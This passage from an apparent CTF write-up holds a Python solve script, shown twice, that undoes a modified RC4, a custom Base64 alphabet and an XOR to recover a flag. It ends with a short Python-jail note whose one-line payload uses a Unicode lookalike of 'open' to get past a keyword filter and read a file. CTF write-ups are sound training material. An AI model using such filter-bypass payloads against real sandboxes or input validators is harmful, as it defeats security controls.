    0x15, 0xF8, 0x9B, 0xAA, 0x8D, 0x31, 0xEC, 0xAA, 0x94, 0x98,
    0x3F, 0xBC, 0xA4, 0xFA, 0x8A, 0x03, 0x2E, 0xF4
]

# 初始魔改表 (事实证明这才是真的表)
# 小写在前，大写在后
custom_table = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"
std_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

# 密钥
key_bytes = b"KKKeeeyyy!!!"


# ==========================================
# 2. 核心算法
# ==========================================

def broken_rc4(key, data):
    """
    破坏版 RC4: 所有的 swap(a, b) 都变成了 a = b (覆盖)
    """
    S = list(range(256))

    # --- KSA ---
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i] = S[j]  # 覆盖！

    # --- PRGA ---
    i = 0
    j = 0
    res = []
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i] = S[j]  # 覆盖！

        t = (S[i] + S[j]) % 256
        k = S[t]
        res.append(char ^ k)

    return bytearray(res)


def final_decode(enc_str):
    """
    解码: Custom Base64 -> XOR 0x5B
    """
    # 补全 padding
    missing = len(enc_str) % 4
    if missing: enc_str += '=' * (4 - missing)

    # 换表
    trans = str.maketrans(custom_table, std_table)
    std_enc = enc_str.translate(trans)

    try:
        raw = base64.b64decode(std_enc)
        # XOR 0x5B
        return "".join([chr(b ^ 0x5B) for b in raw])
    except Exception as e:
        return f"Error: {e}"


# ==========================================
# 3. 执行
# ==========================================

print("[-] 1. Decrypting with Broken RC4...")
rc4_output = broken_rc4(key_bytes, cipher_data)
rc4_str = rc4_output.decode('latin1')  # 此时应该是 dJuY...
print(f"    Result: {rc4_str}")

print("[-] 2. Decoding Final Flag...")
flag = final_decode(rc4_str)

print(f"\nFLAG: {flag}")
```

```
import base64

# ==========================================
# 1. 基础数据
# ==========================================
# 密文 (IDA byte_407070)
cipher_data = [
    0xF4, 0xFA, 0xFB, 0xBD, 0x84, 0x73, 0xFC, 0xE8, 0x8A, 0xCD,
    0x63, 0x84, 0xD1, 0xB7, 0x56, 0x05, 0x86, 0x8E, 0x8E, 0x05,
    0x0C, 0x17, 0xDF, 0x94, 0xD9, 0x00, 0x3E, 0xEC, 0x21, 0xDA,
    0x15, 0xF8, 0x9B, 0xAA, 0x8D, 0x31, 0xEC, 0xAA, 0x94, 0x98,
    0x3F, 0xBC, 0xA4, 0xFA, 0x8A, 0x03, 0x2E, 0xF4
]

# 初始魔改表 (事实证明这才是真的表)
# 小写在前，大写在后
custom_table = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"
std_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

# 密钥
key_bytes = b"KKKeeeyyy!!!"


# ==========================================
# 2. 核心算法
# ==========================================

def broken_rc4(key, data):
    """
    破坏版 RC4: 所有的 swap(a, b) 都变成了 a = b (覆盖)
    """
    S = list(range(256))

    # --- KSA ---
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i] = S[j]  # 覆盖！

    # --- PRGA ---
    i = 0
    j = 0
    res = []
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i] = S[j]  # 覆盖！

        t = (S[i] + S[j]) % 256
        k = S[t]
        res.append(char ^ k)

    return bytearray(res)


def final_decode(enc_str):
    """
    解码: Custom Base64 -> XOR 0x5B
    """
    # 补全 padding
    missing = len(enc_str) % 4
    if missing: enc_str += '=' * (4 - missing)

    # 换表
    trans = str.maketrans(custom_table, std_table)
    std_enc = enc_str.translate(trans)

    try:
        raw = base64.b64decode(std_enc)
        # XOR 0x5B
        return "".join([chr(b ^ 0x5B) for b in raw])
    except Exception as e:
        return f"Error: {e}"


# ==========================================
# 3. 执行
# ==========================================

print("[-] 1. Decrypting with Broken RC4...")
rc4_output = broken_rc4(key_bytes, cipher_data)
rc4_str = rc4_output.decode('latin1')  # 此时应该是 dJuY...
print(f"    Result: {rc4_str}")

print("[-] 2. Decoding Final Flag...")
flag = final_decode(rc4_str)

print(f"\nFLAG: {flag}")
```

## Subgroup_Illuminator

unicode绕过

exit可以回显

发现有文件b内容高度重合，估计是前人写的

print(opₑn("b").read())即可
